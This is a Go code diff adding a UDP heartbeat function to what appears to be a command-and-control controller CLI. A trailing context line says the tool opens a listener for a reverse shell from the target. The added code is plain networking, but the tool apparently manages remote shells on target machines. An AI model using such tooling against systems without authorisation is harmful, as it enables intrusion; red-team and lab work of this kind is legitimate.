@@ -1,3 +1,4 @@
+// Contains the backend logic for the controller cli
 package cli
 
 import (
@@ -28,6 +29,63 @@ func prependHeaderAndSend(msg *message.Message, conn net.Conn) error {
 	}
 
 	return nil
+}
+
+// Heartbeat sends a heartbeat to the host and waits for a response
+func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
+	// Join the IP and port
+	addr := net.JoinHostPort(udpTarget, targetPort)
+
+	listener, err := net.ListenPacket("udp", ":"+srcPort)
+	if err != nil {
+		return fmt.Errorf("opening shell listener: %w", err)
+	}
+	defer listener.Close() // Close listener when function returns
+
+	errChan := make(chan error, 2)
+	doneChan := make(chan struct{})
+
+	// Listen for heartbeat concurrently
+	go func() {
+		buf := make([]byte, 1024)
+		// ReadFrom blocks until a UDP packet arrives
+		n, addr, err := listener.ReadFrom(buf)
+		if err != nil {
+			errChan <- fmt.Errorf("reading from connection: %w", err)
+			return
+		}
+
+		message := string(buf[:n])
+		fmt.Printf("Received heartbeat from %q: %s\n", addr.String(), message)
+		close(doneChan) // Signal successful completion
+	}()
+
+	// Dial the target with udp to send heartbeat request
+	go func() {
+		conn, err := net.Dial("udp", addr)
+		if err != nil {
+			errChan <- fmt.Errorf("connecting to client: %w", err)
+			return
+		}
+		defer conn.Close()
+
+		msg := &message.Message{
+			Type:    message.Heartbeat,
+			DstIP:   targetIP,
+			SrcIP:   srcIP,
+			SrcPort: srcPort,
+			Data:    "",
+		}
+		prependHeaderAndSend(msg, conn)
+	}()
+
+	// Handle synchronization and errors safely
+	select {
+	case err := <-errChan:
+		return fmt.Errorf("heartbeat failed: %w", err)
+	case <-doneChan:
+		return nil // Success
+	}
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
